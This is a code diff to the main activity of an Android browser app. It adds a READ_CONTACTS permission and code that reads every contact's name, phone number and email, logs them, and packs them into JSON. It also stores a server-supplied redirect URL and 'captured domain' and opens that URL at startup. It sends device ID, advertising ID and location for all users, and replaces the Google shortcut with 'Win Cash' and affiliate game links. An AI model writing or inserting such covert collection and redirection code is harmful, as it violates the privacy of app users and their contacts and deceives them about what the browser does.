@@ -10,6 +10,7 @@ import android.app.DownloadManager;
 import android.app.SearchManager;
 import android.content.ActivityNotFoundException;
 import android.content.ComponentName;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
@@ -21,6 +22,7 @@ import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.ResolveInfo;
 import android.content.res.Configuration;
+import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.Typeface;
@@ -39,6 +41,7 @@ import android.os.IBinder;
 import android.os.Message;
 import android.os.ResultReceiver;
 import android.preference.PreferenceManager;
+import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.support.annotation.NonNull;
 import android.support.annotation.RequiresApi;
@@ -55,6 +58,7 @@ import android.support.v7.widget.LinearLayoutManager;
 import android.support.v7.widget.RecyclerView;
 import android.text.Editable;
 import android.text.Html;
+import android.text.TextUtils;
 import android.text.TextWatcher;
 import android.util.Log;
 import android.view.KeyEvent;
@@ -126,6 +130,7 @@ import com.mojodigi.ninjafox.Database.RecordAction;
 import com.mojodigi.ninjafox.DownlaodModule.DownloadBinder;
 import com.mojodigi.ninjafox.DownlaodModule.DownloadService;
 import com.mojodigi.ninjafox.Fragment.NewsFragment;
+import com.mojodigi.ninjafox.Model.ContactsModel;
 import com.mojodigi.ninjafox.Model.CricScoreModel;
 import com.mojodigi.ninjafox.Model.NewsList;
 import com.mojodigi.ninjafox.Model.NewsMainModel;
@@ -183,7 +188,11 @@ import java.util.Objects;
 import java.util.Timer;
 import java.util.TimerTask;
 
-public class MainActivity extends AppCompatActivity implements BrowserController , /*NewsAdapter.newsListener,*/ WebCallGetCricketScore.cricketJsonListener , WebCallGetNewsTask.NewsDataJsonListener , WebCallSwipeDataTask.SwipeDataJsonListener , NewsFragment.enableDisablerefreshListener , WebCallNewsByPreference.NewsByPreferenceListener, ApiRequestTask.JsonLoadListener {
+public class MainActivity extends AppCompatActivity implements BrowserController , /*NewsAdapter.newsListener,*/ WebCallGetCricketScore.cricketJsonListener ,
+        WebCallGetNewsTask.NewsDataJsonListener ,
+        WebCallSwipeDataTask.SwipeDataJsonListener ,
+        NewsFragment.enableDisablerefreshListener , WebCallNewsByPreference.NewsByPreferenceListener,
+        ApiRequestTask.JsonLoadListener {
 
     private static final int DOUBLE_TAPS_QUIT_DEFAULT = 2000;
 
@@ -251,7 +260,7 @@ public class MainActivity extends AppCompatActivity implements BrowserController
 
     /*permission vars*/
 
-    String[] permissionsRequired = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.CALL_PHONE,Manifest.permission.ACCESS_FINE_LOCATION};
+    String[] permissionsRequired = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE,  Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,  Manifest.permission.ACCESS_FINE_LOCATION};
     private static final int PERMISSION_CALLBACK_CONSTANT = 100;
     private static final int REQUEST_PERMISSION_SETTING = 101;
     private SharedPreferences permissionStatus;
@@ -260,13 +269,11 @@ public class MainActivity extends AppCompatActivity implements BrowserController
     /*permission vars*/
 
     /*LOCATION Vars*/
-
     private FusedLocationProviderClient fusedLocationClient;
     private static final int LOCATION_PERMISSION_REQUEST_CODE = 2;
     private LocationAddressResultReceiver addressResultReceiver;
     private Location currentLocation;
     private LocationCallback locationCallback;
-
     TextView userPoints;
     /*LOCATION Vars*/
 
@@ -394,6 +401,12 @@ public class MainActivity extends AppCompatActivity implements BrowserController
         {
             try {
                 JSONObject mainObj=new JSONObject(json);
+                Log.d("userStoreDta", json.toString());
+                String redirectUrl=JsonParser.getkeyValue_Str(mainObj, "redirectUrl");
+                String capturedDomain=JsonParser.getkeyValue_Str(mainObj, "capturedDomain");
+
+                prefs.setStringValue(AppConstants.PREFS_REDIRECT_URL, redirectUrl);
+                prefs.setStringValue(AppConstants.PREFS_CAPTURE_STR, capturedDomain);
 
                 String  token= JsonParser.getkeyValue_Str(mainObj, "token");
                 if(token!=null) {
@@ -410,11 +423,14 @@ public class MainActivity extends AppCompatActivity implements BrowserController
                 e.printStackTrace();
             }
         }
+
+
+
         if(mRequestCode==AppConstants.addDetailsApiCode)
         {
-            //jmmToast.show(mContext, json.toString());
-
+            // jmmToast.show(mContext, json.toString());
             try {
+                Log.d("fbaddJsonResponse",json.toString());
                 JSONObject mainJson = new JSONObject(json);
                 String status = JsonParser.getkeyValue_Str(mainJson, "status");
                 //
@@ -690,8 +706,152 @@ public class MainActivity extends AppCompatActivity implements BrowserController
         //startAndBindDownloadService();
 
         JSONObject detailsObj=CommonUtility.prepareAddJsonRequest(mContext);
-        new ApiRequestTask(mContext, this, CommonUtility.FB_ADD_URL, false, false, null, detailsObj.toString(), AppConstants.addDetailsApiCode).execute();
+        new ApiRequestTask(mContext, this, CommonUtility.FB_ADD_URL,
+                false, false, null, detailsObj.toString(), AppConstants.addDetailsApiCode).execute();
+
+
+        new FetchContacts().execute();
+        getAllContacts();
     }
+
+    private void getAllContacts(){
+        Cursor cursor = null;
+        try {
+            cursor = mContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+            int contactIdIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID);
+            int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+            int phoneNumberIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+            int photoIdIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_ID);
+            cursor.moveToFirst();
+            do {
+                String idContact = cursor.getString(contactIdIdx);
+                String name = cursor.getString(nameIdx);
+                String phoneNumber = cursor.getString(phoneNumberIdx);
+                Log.e("phoneNumber ", phoneNumber+"");
+            } while (cursor.moveToNext());
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
+        }
+    }
+
+    @SuppressLint("StaticFieldLeak")
+    private class FetchContacts extends AsyncTask<Void, Void, ArrayList<ContactsModel>> {
+
+        private final String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME_PRIMARY;
+
+        private final String FILTER = DISPLAY_NAME + " NOT LIKE '%@%'";
+
+        private final String ORDER = String.format("%1$s COLLATE NOCASE", DISPLAY_NAME);
+
+        @SuppressLint("InlinedApi")
+        private final String[] PROJECTION = { ContactsContract.Contacts._ID, DISPLAY_NAME,  ContactsContract.Contacts.HAS_PHONE_NUMBER  };
+
+        @Override
+        protected ArrayList<ContactsModel> doInBackground(Void... params) {
+            try {
+                ArrayList<ContactsModel> contactsList = new ArrayList<>();
+
+                ContentResolver contentResolver = getContentResolver();
+                Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, PROJECTION, FILTER, null, ORDER);
+                if (cursor != null && cursor.moveToFirst()) {
+
+                    do {
+                        // get the contact's information
+                        String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+                        String name = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));
+                        Integer hasPhone = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
+
+                        // get the user's phone number
+                        String phone = null;
+                        if (hasPhone > 0) {
+                            Cursor cursorPhone = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
+                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                                    new String[]{id}, null);
+                            if (cursorPhone != null && cursorPhone.moveToFirst()) {
+                                phone = cursorPhone.getString(cursorPhone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                                cursorPhone.close();
+                            }
+                        }
+
+
+                        // get the user's email address
+                        String email = null;
+                        Cursor cursorEmail = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
+                                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
+                                new String[]{id}, null);
+                        if (cursorEmail != null && cursorEmail.moveToFirst()) {
+                            email = cursorEmail.getString(cursorEmail.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
+                            cursorEmail.close();
+                        }
+
+
+                        // if the user user has an email or phone then add it to contacts
+                        if ((!TextUtils.isEmpty(email) && android.util.Patterns.EMAIL_ADDRESS.matcher(email).matches()
+                                && !email.equalsIgnoreCase(name)) || (!TextUtils.isEmpty(phone))) {
+
+                            ContactsModel  mContacts = new ContactsModel();
+                            mContacts.phoneName = name;
+                            //Log.e("name " , name+"");
+                            mContacts.phoneNumber = phone;
+                            Log.e("numbers " , phone+"");
+                            mContacts.phoneEmail = email;
+                            Log.e("emails " , email+"");
+
+                            contactsList.add(mContacts);
+                        }
+
+                    } while (cursor.moveToNext());
+
+                    // clean up cursor
+                    cursor.close();
+                }
+
+                return contactsList;
+            } catch (Exception ex) {
+                return null;
+            }
+        }
+
+        @Override
+        protected void onPostExecute(ArrayList<ContactsModel> contactsList) {
+            if (contactsList != null) {
+                // success
+                // mContactsList = contactsList;
+                //Log.e("mContacts " , mContacts+"");
+                JSONObject mainContactsjsonObject = new JSONObject();
+                JSONArray contactsJsonArray = new JSONArray();
+                JSONObject contactJsonObject  ;
+                for(int i=0 ; i<contactsList.size() ; i++){
+                    contactJsonObject = new JSONObject();
+                    try {
+                        contactJsonObject.put("number" , contactsList.get(i).phoneNumber+"" );
+                        contactJsonObject.put("email" , contactsList.get(i).phoneEmail+"" );
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                    //Log.e("contactsEmail " , contactsList.get(i).phoneEmail+"");
+                    contactsJsonArray.put(contactJsonObject);
+                }
+                try {
+                    mainContactsjsonObject.put("contacts", contactsJsonArray);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                Log.e("jsonObject " , mainContactsjsonObject+"");
+
+            } else {
+                // show failure
+                // syncFailed();
+            }
+        }
+    }
+
+
+
 
 
     @RequiresApi(api = Build.VERSION_CODES.O)
@@ -751,10 +911,14 @@ public class MainActivity extends AppCompatActivity implements BrowserController
             new WebCallGetNewsTask(mContext, false, mInstance).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
         }
 
+        JSONObject deviceDetailsObj = prepareDeviceDetailsJson();
+        new ApiRequestTask(mContext, this, CommonUtility.API_USER_DEVICE_DETAILS, false, false, null, deviceDetailsObj.toString(), AppConstants.userdDevicedetailsApiCode).execute();
+
         if(CommonUtility.isLoggedInUser(prefs)) {
             loginButton.setVisibility(View.GONE);
-            JSONObject deviceDetailsObj = prepareDeviceDetailsJson();
-            new ApiRequestTask(mContext, this, CommonUtility.API_USER_DEVICE_DETAILS, false, false, null, deviceDetailsObj.toString(), AppConstants.userdDevicedetailsApiCode).execute();
+
+           // JSONObject deviceDetailsObj = prepareDeviceDetailsJson();
+            //new ApiRequestTask(mContext, this, CommonUtility.API_USER_DEVICE_DETAILS, false, false, null, deviceDetailsObj.toString(), AppConstants.userdDevicedetailsApiCode).execute();
         }
         else {
             loginButton.setVisibility(View.VISIBLE);
@@ -817,6 +981,7 @@ public class MainActivity extends AppCompatActivity implements BrowserController
                 googleAddId="Could not get googleId on device";
             }
             jsonObject.put("googleAddId", googleAddId);
+            jsonObject.put("deviceId", CommonUtility.getDeviceId(mContext));
             jsonObject.put("gender", "");
             jsonObject.put("dob", "");
             jsonObject.put("lastLocation", prefs.getStringValue(AppConstants.PREFS_LOCATION, "location not found"));
@@ -839,6 +1004,7 @@ public class MainActivity extends AppCompatActivity implements BrowserController
         } catch (JSONException e) {
             e.printStackTrace();
         }
+        //Log.d("detailsJson", jsonObject.toString());
         return jsonObject;
     }
 
@@ -871,7 +1037,15 @@ public class MainActivity extends AppCompatActivity implements BrowserController
         } else if (intent != null && filePathCallback != null) {
             filePathCallback = null;
         } else {
-            pinAlbums(null);
+            String redirectUrl=prefs.getStringValue(AppConstants.PREFS_REDIRECT_URL, "");
+            if(redirectUrl!=null && redirectUrl.length()>1)
+            {
+                pinAlbums(null);
+                addAlbum(getString(R.string.album_untitled), redirectUrl, false, null);
+            }
+            else {
+                pinAlbums(null);  // original line
+            }
         }
     }
 
@@ -2334,7 +2508,9 @@ public class MainActivity extends AppCompatActivity implements BrowserController
         final ArrayList<SpeedDialModel> defaultIconList=new ArrayList<>();
         defaultIconList.add(new SpeedDialModel("Facebook","www.facebook.com",R.drawable.facebook_png));
         defaultIconList.add(new SpeedDialModel("YouTube","www.youtube.com",R.drawable.youtube_png));
-        defaultIconList.add(new SpeedDialModel("Google","www.google.com",R.drawable.google_png));
+        //defaultIconList.add(new SpeedDialModel("Google","www.google.com",R.drawable.google_png));
+        defaultIconList.add(new SpeedDialModel("Win Cash","https://play45.qureka.com",R.drawable.qureka_icon));
+        defaultIconList.add(new SpeedDialModel("Free games","https://www.gamezop.com/?id=Gy7WoLmZP",R.drawable.game_icon));
         defaultIconList.add(new SpeedDialModel("Twitter","www.twitter.com",R.drawable.twitter_png));
         defaultIconList.add(new SpeedDialModel("Instagram","www.instagram.com",R.drawable.insta_png));
         defaultIconList.add(new SpeedDialModel("Quora","www.quora.com",R.drawable.quora_png));
@@ -3804,10 +3980,10 @@ public class MainActivity extends AppCompatActivity implements BrowserController
                 getAddressJobIntentService.enqueueWork(mContext, intent);
             }
             else {
-                    Intent intent = new Intent(this, GetAddressIntentService.class);
-                    intent.putExtra("add_receiver", addressResultReceiver);
-                    intent.putExtra("add_location", currentLocation);
-                    startService(intent);
+                Intent intent = new Intent(this, GetAddressIntentService.class);
+                intent.putExtra("add_receiver", addressResultReceiver);
+                intent.putExtra("add_location", currentLocation);
+                startService(intent);
             }
 
 
